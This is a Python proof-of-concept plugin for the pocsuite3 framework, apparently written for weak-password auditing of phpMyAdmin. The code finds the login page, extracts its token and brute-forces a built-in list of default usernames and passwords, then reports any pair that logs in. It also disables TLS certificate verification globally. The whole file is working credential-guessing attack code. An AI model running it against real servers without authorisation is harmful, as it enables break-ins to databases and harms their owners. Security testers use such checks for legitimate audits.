#!/usr/bin/env python
# coding: utf-8
import re

from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
import ssl


ssl._create_default_https_context = ssl._create_unverified_context


class TestPOC(POCBase):
    vulID = '00003'
    version = '1.0'
    author = ''
    vulDate = '2013-04-23'
    createDate = '2016-03-07'
    updateDate = '2016-03-07'
    references = ''
    name = 'phpMyAdmin 弱密码漏洞'
    appPowerLink = 'http://www.phpMyAdmin.com/'
    appName = 'phpMyAdmin'
    appVersion = 'ALL'
    vulType = 'Weak Password'
    desc = '''
    phpMyAdmin弱口令登录，从而导致攻击者可据此信息进行后续攻击。
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        flag='frameborder="0" id="frame_content"'
        user_list = ['root', 'admin']
        password_list = ['root', '123456', '12345678', 'password', 'passwd', '123', 'admin', 'admin123']
        try:
            # 探测路径和检验存活
            rep1=requests.get(self.url,timeout=5)
            login_url=self.url + "/index.php" if "phpMyAdmin" in rep1.text else self.url + "/phpmyadmin/index.php"

            # 第一次请求
            response = requests.get(login_url,timeout=5)


            # 获取token
            token_search = re.compile(r'token=(.*?)"\s?target')

            token = token_search.search(response.text)
            if not token:
                return self.parse_output(result)
            token_value = token.group(1)
            # 第二次请求登录
            for username in user_list:
                for password in password_list:
                    login_data = {
                        "pma_username": username,
                        "pma_password": password,
                        "server": "1",
                        "lang": "zh_CN",
                        "token": token_value
                    }
                    logger.info("check {}:{}".format(username,password))
                    respond = requests.post(login_url, data=login_data,timeout=5)
                    if flag in respond.text:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['url'] = login_url
                        result['VerifyInfo']['username'] = username
                        result['VerifyInfo']['password'] = password
                        return self.parse_output(result)
        except Exception as e:
            logger.warning(e)
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)

